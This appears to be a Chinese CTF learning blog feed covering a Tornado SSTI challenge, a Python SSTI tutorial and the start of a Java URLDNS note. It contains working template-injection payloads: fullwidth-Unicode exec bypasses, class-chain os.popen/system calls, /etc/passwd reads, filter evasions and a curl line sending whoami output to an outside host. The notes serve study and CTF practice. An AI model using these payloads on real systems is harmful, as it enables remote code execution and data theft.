class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:5001/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-TW,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">left=<span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">90</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">92</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">89</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">8</span>E<span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">94</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">22</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">81</span><span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">29</span>&amp;right=<span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">90</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">92</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">89</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">8</span>E<span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">94</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">85</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">98</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">85</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">92</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">85</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">91</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">95</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">85</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">93</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">94.</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">81</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">92</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">87</span><span class="meta">%</span>EF<span class="meta">%</span>BD<span class="meta">%</span><span class="number">93</span><span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span><span class="number">221</span><span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">29</span></span></span><br></pre></td></tr></table></figure>
<h1 id="x02">0x02</h1>
<p><strong>2022</strong>虎符决赛的一题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, os</span><br><span class="line"></span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        self.render(<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;tornado&#x27;</span>, <span class="string">&#x27;龙卷风摧毁停车场&#x27;</span>)</span><br><span class="line">        black_func = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;help&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;method&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;decode&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&amp;&quot;</span>]</span><br><span class="line"></span><br><span class="line">        black_symbol = [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;.&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;0o&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;*&quot;</span>]</span><br><span class="line">        black_keyword = [<span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;while&#x27;</span>]</span><br><span class="line">        black_rce = [<span class="string">&#x27;render&#x27;</span>, <span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;extends&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;raw&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;apply&#x27;</span>,<span class="string">&quot;True&quot;</span>,<span class="string">&quot;False&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(msg)&gt;<span class="number">1500</span>) :</span><br><span class="line">            self.render(<span class="string">&#x27;static/hack.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        bans = black_func + black_symbol + black_keyword + black_rce</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                <span class="built_in">print</span>(ban)</span><br><span class="line">                self.render(<span class="string">&#x27;static/hack.html&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;static/user.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(</span><br><span class="line">                <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;你使用 %s 摧毁了tornado&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">            </span><br><span class="line">        self.render(<span class="string">&#x27;static/user.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_app</span>():</span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([(<span class="string">&#x27;/&#x27;</span>, IndexHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">5001</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>一样的思路，<strong>Payload</strong>附上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tornado=&#123;&#123;a=list(vars(ｒｅｑｕｅｓｔ))[3]&#125;&#125;&#123;&#123;b=list(vars(ｒｅｑｕｅｓｔ)[a])[-2]&#125;&#125;&#123;&#123;ｅｘｅｃ(vars(ｒｅｑｕｅｓｔ)[a][b])&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>构造请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5001</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>369</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;.Not/A)Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;103&quot;, &quot;Chromium&quot;;v=&quot;103&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:5001</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:5001/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-TW,zh;q=0.9</span><br><span class="line">1: __import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; static/hack.html&#x27;)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">tornado<span class="operator">=</span><span class="variable">%7</span>B<span class="variable">%7</span>Ba<span class="variable">%3</span>Dlist<span class="variable">%28</span>vars<span class="variable">%28</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%92</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%95</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%93</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%94</span><span class="variable">%29</span><span class="variable">%29</span><span class="variable">%5</span>B<span class="number">3</span><span class="variable">%5</span>D<span class="variable">%7</span>D<span class="variable">%7</span>D<span class="variable">%7</span>B<span class="variable">%7</span>Bb<span class="variable">%3</span>Dlist<span class="variable">%28</span>vars<span class="variable">%28</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%92</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%95</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%93</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%94</span><span class="variable">%29</span><span class="variable">%5</span>Ba<span class="variable">%5</span>D<span class="variable">%29</span><span class="variable">%5</span>B<span class="number">-2</span><span class="variable">%5</span>D<span class="variable">%7</span>D<span class="variable">%7</span>D<span class="variable">%7</span>B<span class="variable">%7</span>B<span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%98</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%83</span><span class="variable">%28</span>vars<span class="variable">%28</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%92</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%95</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%85</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%93</span><span class="variable">%EF</span><span class="variable">%BD</span><span class="variable">%94</span><span class="variable">%29</span><span class="variable">%5</span>Ba<span class="variable">%5</span>D<span class="variable">%5</span>Bb<span class="variable">%5</span>D<span class="variable">%29</span><span class="variable">%7</span>D<span class="variable">%7</span>D</span></span><br></pre></td></tr></table></figure>
<h1 id="别的什么">别的什么</h1>
<p>原理大概是和<strong>Python</strong>解释器的编码读取问题相关，翻了一下暂时不是太想深究下去<strong>XD</strong>。</p>
<ul>
<li>字符串是以<strong>Unicode</strong>编码的。</li>
<li>解释器默认是以<strong>UTF-8</strong>读取源码的。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ｅｘｅｃ(<span class="string">&quot;print(&#x27;1&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以直接在<strong>3</strong>中执行，<strong>2</strong>中会报错。</p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>关于SSTI的学习</title>
    <url>/Study-SSTI/</url>
    <content><![CDATA[<p>摸了。</p>
<span id="more"></span>
<h3 id="注入指令构造">注入指令构造</h3>
<p><strong>Python</strong>中的每一个对象都有一个<strong>__class__</strong>属性可以获取到它自己所对应的类，比如一个空字符串<code>''</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在类对象中有一个<code>__mro__</code>属性，它返回一个<strong>tuple</strong>元组，这个对象包含了当前类对象所有继承的基类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line"><span class="comment"># (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span></span><br></pre></td></tr></table></figure>
<p>还有一个有些相似的<code>__base__</code>属性，返回当前类对象所继承的基类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>__subclasses__()</code>这个方法返回了类的所有存活的子类，如下列代码所示，<strong>object</strong>是所有类的父类，因此由<strong>object</strong>返回的会是最全的子类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment"># [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, ..., &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;rlcompleter.Completer&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
<p>这边需要配合例题了，攻防世界—Web_python_template_injection。</p>
<p>在Python中的命令执行一般是通过os模块中的system函数来达成，因此需要获取所有子类后遍历来找到os相关的模块，比如site._Printer和site.Quitter。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()):</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>得知在第71个，因此可以这样获取到它。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>]</span><br></pre></td></tr></table></figure>
<p>然后对其进行初始化，把类转为实例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__</span><br></pre></td></tr></table></figure>
<p>进而用<code>__globals__</code>获取到os模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>打开通道传入命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最后读取命令返回的结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>也可以不用通道，直接调用<strong>system</strong>命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>一共有这些类是可以进行命令执行的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="string">&#x27;linechache&#x27;</span>)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="string">&#x27;linechache&#x27;</span>)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, <span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">(<span class="number">79</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还可以通过<strong>file</strong>模块，来进行任意文件读取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>常用的模板引擎：<strong>Smarty</strong>，<strong>Mako</strong>，<strong>Jinja2</strong>，<strong>Jade</strong>，<strong>Velocity</strong>，<strong>Freemaker</strong>和<strong>Twig</strong>。</p>
<p>常见的判断手法：</p>
<figure>
<img src="/images/Study-SSTI//image-20220223141713769.jpg"
alt="image-20220223141713769" />
<figcaption aria-hidden="true">image-20220223141713769</figcaption>
</figure>
<h3 id="一些绕过">一些绕过</h3>
<h4 id="拼接">拼接</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;fla&#x27;</span>+<span class="string">&#x27;g.txt&#x27;</span>)).read()</span><br></pre></td></tr></table></figure>
<h4 id="编码">编码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span></span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;ZXZhbA==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h4 id="过滤中括号">过滤中括号[]</h4>
<h5 id="getitem__"><code>__getitem__</code></h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;.__class__.__mro__[2]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h5 id="pop">pop()</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="字典读取">字典读取</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;eval&#x27;</span>]()</span><br><span class="line">__builtins__.<span class="built_in">eval</span>()</span><br></pre></td></tr></table></figure>
<h4 id="过滤双下划线__">过滤双下划线__</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">&#125;&#125;&amp;<span class="keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
<h4 id="过滤花括号">过滤花括号</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化修炼计划 URLDNS</title>
    <url>/Study-URLDNS/</url>
    <content><![CDATA[<p><strong>URLDNS</strong>来自于原生类，且不受<strong>JDK</strong>版本限制，故常用于检测反序列化。</p>
<span id="more"></span>
<h1 id="原理">原理</h1>
<p>首先是<strong>HashMap#readObject</strong>，调用了<strong>putVal</strong>方法，对传入的<strong>key</strong>进行了哈希计算。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>hash</strong>方法会调用传入对象的<strong>hashCode</strong>方法。</p>
